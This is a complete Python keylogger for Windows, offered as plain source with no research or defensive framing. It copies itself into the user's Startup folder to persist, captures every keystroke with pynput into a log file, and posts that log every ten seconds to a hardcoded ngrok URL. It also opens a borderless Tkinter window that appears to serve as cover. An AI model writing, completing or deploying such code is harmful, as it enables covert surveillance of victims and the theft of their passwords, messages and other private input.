import os
import shutil
import sys
import threading
import time
from pynput import keyboard
import logging
from datetime import datetime
from tkinter import *
import requests
import ctypes
import sys
import subprocess




SERVER_URL = " https://a90e4bebaa09.ngrok-free.app/upload"
UPLOAD_INTERVAL = 10


current_exe_path = sys.executable
startup_folder = os.path.join(os.getenv('APPDATA'), 'Microsoft', 'Windows', 'Start Menu', 'Programs', 'Startup')
startup_exe_path = os.path.join(startup_folder, os.path.basename(current_exe_path))

if not os.path.exists(startup_exe_path):
    try:
        shutil.copy2(current_exe_path, startup_exe_path)
        print("Copied to startup folder.")
    except Exception as e:
        print("Failed to copy to startup folder:", e)


log_file = f"keylog_{datetime.now().strftime('%Y-%m-%d_%H-%M-%S')}.txt"
logging.basicConfig(filename=log_file, level=logging.DEBUG, format='%(asctime)s: %(message)s')


def on_press(key):
    try:
        logging.info(f"{key.char}")
    except AttributeError:
        logging.info(f"[{key}]")


def upload_log():
    while True:
        time.sleep(UPLOAD_INTERVAL)
        try:
            with open(log_file, 'r') as f:
                data = f.read()
            
            if data.strip(): 
                response = requests.post(SERVER_URL, data={'log': data})
                if response.status_code == 200:
                    print("Log uploaded.")
                else:
                    print(f"Failed to upload: {response.status_code}")
        except Exception as e:
            print("Error uploading log:", e)


def run_gui():
    root = Tk()
    root.geometry("600x600")
    root.overrideredirect(True)  # Hide window decorations
    root.mainloop()




upload_thread = threading.Thread(target=upload_log, daemon=True)
upload_thread.start()


keylogger_thread = threading.Thread(target=lambda: keyboard.Listener(on_press=on_press).run(), daemon=True)
keylogger_thread.start()


run_gui()
